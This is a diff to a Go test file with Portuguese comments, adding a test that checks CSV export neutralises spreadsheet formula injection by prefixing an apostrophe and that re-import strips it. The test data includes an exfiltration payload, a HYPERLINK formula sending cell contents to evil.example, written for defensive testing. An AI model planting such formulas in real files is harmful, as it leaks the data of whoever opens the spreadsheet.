@@ -1,6 +1,7 @@
 package trilha
 
 import (
+	"encoding/csv"
 	"net/http"
 	"net/http/httptest"
 	"strings"
@@ -290,5 +291,43 @@ func TestBindCSVRecusaODestinoErrado(t *testing.T) {
 	var n csvNo
 	if _, err := BindCSV(strings.NewReader("codigo\nA1\n"), &n); err == nil {
 		t.Fatal("aceitou um ponteiro que não é para lista")
+	}
+}
+
+// Injeção de fórmula: uma célula de texto que começa com = + - @ (ou tab/CR) é
+// executada pelo Excel e pelo LibreOffice — =HYPERLINK manda o conteúdo da
+// planilha para fora. O apóstrofo na frente faz a planilha ler texto, e o
+// BindCSV tira o apóstrofo na volta, então o arquivo vai e volta igual.
+func TestCSVNeutralizaFormula(t *testing.T) {
+	type linha struct {
+		Nome string `csv:"Nome"`
+	}
+	perigosos := []string{`=HYPERLINK("https://evil.example/?d="&A2,"x")`, "+1+1", "-2+3", "@SUM(A1)", "\tx"}
+	var rows []linha
+	for _, p := range perigosos {
+		rows = append(rows, linha{p})
+	}
+	c, rec := csvCtx("")
+	if err := c.CSV("x", rows); err != nil {
+		t.Fatal(err)
+	}
+	r := csv.NewReader(strings.NewReader(strings.TrimPrefix(rec.Body.String(), "\ufeff")))
+	all, err := r.ReadAll()
+	if err != nil {
+		t.Fatal(err)
+	}
+	for i, p := range perigosos {
+		if all[i+1][0] != "'"+p {
+			t.Errorf("%q saiu %q", p, all[i+1][0])
+		}
+	}
+	var volta []linha
+	if _, err := BindCSV(strings.NewReader(rec.Body.String()), &volta); err != nil {
+		t.Fatal(err)
+	}
+	for i, p := range perigosos {
+		if want := strings.TrimSpace(p); volta[i].Nome != want {
+			t.Errorf("volta %q, quer %q", volta[i].Nome, want)
+		}
 	}
 }
